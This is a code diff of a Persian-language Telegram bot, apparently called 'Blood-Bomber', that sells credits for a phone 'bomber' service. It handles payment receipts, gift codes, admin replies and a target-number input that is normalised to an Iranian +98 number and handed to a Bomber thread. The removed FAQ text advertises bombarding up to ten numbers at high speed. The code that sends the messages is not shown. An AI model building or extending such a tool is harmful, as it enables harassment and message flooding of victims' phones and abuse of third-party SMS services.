             del pending_approvals[req_id]
 
     elif call.data.startswith("admin_reject_"):
@@ -562,44 +395,40 @@ def handle_callbacks(call):
             bot.send_message(uid, "❌ رسید شما رد شد.")
             del pending_approvals[req_id]
 
-# ==========================================
-# 7. پنل ادمین
-# ==========================================
-@bot.message_handler(commands=['admin'])
-def cmd_admin(message):
-    if message.from_user.id != ADMIN_ID: return
-    markup = types.InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        types.InlineKeyboardButton("📊 آمار کل", callback_data="admin_stats"),
-        types.InlineKeyboardButton("👥 لیست کاربران", callback_data="admin_list_users"),
-        types.InlineKeyboardButton("🎁 شارژ همگانی", callback_data="admin_bulk_charge"),
-        types.InlineKeyboardButton("📉 کسر همگانی", callback_data="admin_bulk_deduct"),
-        types.InlineKeyboardButton("🔑 ساخت کد هدیه", callback_data="admin_gifts"),
-        types.InlineKeyboardButton("👤 مشاهده کاربر", callback_data="admin_view_user"),
-        types.InlineKeyboardButton("💾 دریافت بکاپ", callback_data="admin_backup")
-    )
-    bot.reply_to(message, "**پنل مدیریت**", reply_markup=markup, parse_mode='Markdown')
+def send_broadcast(message):
+    db = load_db()
+    count = 0
+    for uid in db.keys():
+        try: bot.send_message(uid, f"📢 {message.text}"); count += 1; time.sleep(0.1)
+        except: pass
+    bot.reply_to(message, f"✅ ارسال به {count} نفر.")
+
+def process_make_gift(message):
+    try:
+        parts = message.text.split()
+        active_gift_codes[parts[0].upper()] = {"uses": int(parts[1]), "amount": 5}
+        bot.reply_to(message, f"✅ کد ساخته شد.")
+    except: bot.reply_to(message, "❌ فرمت اشتباه.")
 
 # ==========================================
-# 8. دریافت ورودی‌ها (شامل هوش مصنوعی)
+# 5. دریافت ورودی‌های متنی
 # ==========================================
 @bot.message_handler(content_types=['photo'])
 def handle_photo(message):
     user_id = str(message.from_user.id)
     if "selected_plan" not in user_states.get(user_id, {}):
-        bot.reply_to(message, "ابتدا از منو یک پلن انتخاب کنید.")
+        bot.reply_to(message, "⚠️ ابتدا پلن انتخاب کنید.")
         return
+        
     plan_key = user_states[user_id]["selected_plan"]
     plan = PLANS[plan_key]
     req_id = f"{user_id}_{int(time.time())}"
     pending_approvals[req_id] = {"user_id": user_id, "plan": plan_key}
-    bot.reply_to(message, "✅ رسید دریافت شد. منتظر تایید باشید.")
+    
+    bot.reply_to(message, "✅ رسید دریافت شد.")
     markup = types.InlineKeyboardMarkup(row_width=2)
-    markup.add(
-        types.InlineKeyboardButton("✅ تایید", callback_data=f"admin_approve_{req_id}"),
-        types.InlineKeyboardButton("❌ رد", callback_data=f"admin_reject_{req_id}")
-    )
-    bot.send_message(ADMIN_ID, f"📩 **رسید:**\nکاربر: `{user_id}`\nپلن: **{plan['name']}**", reply_markup=markup, parse_mode='Markdown')
+    markup.add(types.InlineKeyboardButton("✅ تایید", callback_data=f"admin_approve_{req_id}"), types.InlineKeyboardButton("❌ رد", callback_data=f"admin_reject_{req_id}"))
+    bot.send_message(ADMIN_ID, f"📩 رسید از `{user_id}` برای **{plan['name']}**", reply_markup=markup, parse_mode='Markdown')
     bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
     del user_states[user_id]
 
@@ -607,70 +436,35 @@ def handle_photo(message):
 def process_text_inputs(message):
     user_id = str(message.from_user.id)
     state = user_states[user_id].get("state")
-    service_type = user_states[user_id].get("service", "free")
-    user = get_user(user_id)
+    db = load_db()
     
-    if message.text == "لغو":
-        del user_states[user_id]
-        bot.reply_to(message, "عملیات لغو شد.", reply_markup=get_main_menu())
-        return
-    
-    if state == "waiting_for_support":
-        bot.send_message(ADMIN_ID, f"🎧 پیام از `{user_id}`:\n\n{message.text}")
-        bot.reply_to(message, "✅ پیام ارسال شد.")
+    if state == "waiting_for_name":
+        db[user_id]["name"] = message.text
+        save_db(db)
+        bot.reply_to(message, "✅ نام شما تغییر کرد.")
         del user_states[user_id]
 
-    elif state == "waiting_for_ai":
+    elif state == "waiting_for_support":
+        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("✍️ پاسخ به کاربر", callback_data=f"admin_reply_{user_id}"))
+        bot.send_message(ADMIN_ID, f"🎧 پیام از `{user_id}`:\n\n{message.text}", reply_markup=markup)
+        bot.reply_to(message, "✅ پیام شما برای پشتیبانی ارسال شد.")
         del user_states[user_id]
-        q = message.text.lower()
-        answer = "متاسفم، پاسخ این سوال را نمی‌دانم. لطفاً با پشتیبانی در ارتباط باشید."
-        
-        if "خرید" in q or "اعتبار" in q:
-            answer = "برای خرید اعتبار، از دکمه '💳 خرید اعتبار' استفاده کنید. پلن مورد نظر را انتخاب کرده و پس از واریز، رسید را ارسال کنید."
-        elif "بمبر" in q or "ارسال" in q or "پیام" in q:
-            answer = "برای اجرای بمبر، از دکمه‌های '🆓 اجرای رایگان' یا '💎 اجرای اشتراکی' استفاده کنید. سپس شماره هدف را وارد کنید."
-        elif "vip" in q or "ویژه" in q:
-            answer = "پلن VIP با ۱۰۰۰ اعتبار به شما امکان می‌دهد تا ۱۰ شماره را با سرعت بالا بمباران کنید. از دکمه '👑 پنل VIP' استفاده کنید."
-        elif "دعوت" in q or "زیرمجموعه" in q:
-            answer = "با دستور /invite لینک اختصاصی خود را دریافت کنید. هر نفر که با لینک شما وارد شود، ۵ اعتبار هدیه می‌گیرید."
-        elif "شانس" in q or "گردونه" in q:
-            answer = "هر ۲۴ ساعت یک بار می‌توانید گردونه شانس را بچرخانید و بین ۱ تا ۵۰ اعتبار برنده شوید."
-        elif "جوین" in q or "عضویت" in q:
-            answer = "برای استفاده از ربات باید در کانال‌های ما عضو شوید. پس از عضویت، دکمه '✅ عضو شدم' را بزنید."
-            
-        bot.reply_to(message, f"🤖 **پاسخ هوش مصنوعی:**\n\n{answer}", parse_mode='Markdown')
 
     elif state == "waiting_for_phone":
-        phones = message.text.strip().replace(" ", "").split(",")
-        max_phones = SERVICE_CONFIG.get(service_type, SERVICE_CONFIG["free"])["max_phones"]
-        if len(phones) > max_phones:
-            bot.reply_to(message, f"❌ حداکثر تعداد شماره برای این سرویس {max_phones} است.")
+        phone = message.text.strip().replace(" ", "")
+        if len(phone) < 10 or not phone.isdigit():
+            bot.reply_to(message, "❌ شماره نامعتبر.")
             return
-        if any(len(p) < 10 or not p.isdigit() for p in phones):
-            bot.reply_to(message, "❌ فرمت نامعتبر.")
+        if not phone.startswith("+"): phone = "+98" + phone.lstrip("0")
+        if db.get(user_id, {}).get('uses', 0) <= 0:
+            bot.reply_to(message, "❌ اعتبار ندارید!")
+            del user_states[user_id]
             return
-        
-        if service_type == "free":
-            today = datetime.now().strftime("%Y-%m-%d")
-            if user['last_bomb_date'] != today:
-                user['last_bomb_date'] = today
-                user['daily_bomb_count'] = 0
-            if user['daily_bomb_count'] + len(phones) > SERVICE_CONFIG["free"]["max_daily"]:
-                bot.reply_to(message, "❌ سهمیه رایگان شما پر شده!")
-                del user_states[user_id]
-                return
-            user['daily_bomb_count'] += len(phones)
-        else:
-            if user['credits'] < len(phones):
-                bot.reply_to(message, "❌ اعتبار کافی ندارید!")
-                del user_states[user_id]
-                return
-            user['credits'] -= len(phones)
-            
-        save_user(**user)
+        db[user_id]["uses"] -= 1
+        save_db(db)
         del user_states[user_id]
-        bot.reply_to(message, f"🚀 **شروع شد!** هدف: `{len(phones)}` شماره", parse_mode='Markdown')
-        bomber = Bomber(",".join(phones), user_id, service_type)
+        bot.reply_to(message, f"🚀 **شروع شد!** هدف: `{phone}`", parse_mode='Markdown')
+        bomber = Bomber(phone, user_id)
         active_bombers[user_id] = bomber
         threading.Thread(target=bomber.start).start()
 
@@ -678,59 +472,30 @@ def process_text_inputs(message):
         code = message.text.strip().upper()
         del user_states[user_id]
         if code in active_gift_codes and active_gift_codes[code]["uses"] > 0:
-            amount = active_gift_codes[code]["credits"]
+            amount = active_gift_codes[code]["amount"]
             active_gift_codes[code]["uses"] -= 1
-            user['credits'] += amount
-            save_user(**user)
-            bot.reply_to(message, f"{amount} اعتبار اضافه شد.")
+            db[user_id]["uses"] += amount
+            save_db(db)
+            bot.reply_to(message, f"🎁 {amount} اعتبار اضافه شد.")
         else:
             bot.reply_to(message, "❌ کد نامعتبر.")
 
 # ==========================================
-# 9. توابع کمکی
+# 6. سیستم پاسخ ادمین به تیکت
 # ==========================================
-def process_bulk_charge(message):
-    if message.from_user.id != ADMIN_ID: return
-    try:
-        amount = int(message.text.strip())
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        c.execute("UPDATE users SET credits = credits + ?", (amount,))
-        conn.commit()
-        conn.close()
-        bot.send_message(ADMIN_ID, f"✅ شارژ انجام شد.")
-    except: pass
+@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_reply_") and call.from_user.id == ADMIN_ID)
+def admin_reply_ticket(call):
+    target_user = call.data.replace("admin_reply_", "")
+    msg = bot.send_message(call.message.chat.id, "پاسخ خود را بنویسید:")
+    bot.register_next_step_handler(msg, lambda m: send_reply_to_user(m, target_user))
 
-def process_bulk_deduct(message):
-    if message.from_user.id != ADMIN_ID: return
+def send_reply_to_user(message, target_user):
     try:
-        amount = int(message.text.strip())
-        conn = sqlite3.connect(DB_FILE)
-        c = conn.cursor()
-        c.execute("UPDATE users SET credits = MAX(0, credits - ?)", (amount,))
-        conn.commit()
-        conn.close()
-        bot.send_message(ADMIN_ID, f"✅ کسر انجام شد.")
-    except: pass
-
-def process_make_gift(message):
-    try:
-        parts = message.text.split()
-        active_gift_codes[parts[0].upper()] = {"uses": int(parts[1]), "credits": 5}
-        bot.reply_to(message, f"✅ کد ساخته شد.")
-    except: bot.reply_to(message, "❌ فرمت اشتباه.")
-
-def view_user_admin(message):
-    uid = message.text.strip()
-    user = get_user(uid)
-    if user:
-        bot.reply_to(message, f"👤 {user['name']}\n👑 {user['plan']}\n💰 {user['credits']} اعتبار")
-    else: bot.reply_to(message, "❌ کاربر یافت نشد.")
+        bot.send_message(target_user, f"📩 **پاسخ پشتیبانی:**\n\n{message.text}", parse_mode='Markdown')
+        bot.reply_to(message, "✅ پاسخ ارسال شد.")
+    except:
+        bot.reply_to(message, "❌ خطا در ارسال.")
 
 if __name__ == "__main__":
-    try:
-        threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)), use_reloader=False), daemon=True).start()
-        print("🤖 Blood-Bomber is running...")
-        bot.infinity_polling()
-    except Exception as e:
-        traceback.print_exc()
+    print("🤖 Bot & Web Server running...")
+    bot.infinity_polling()
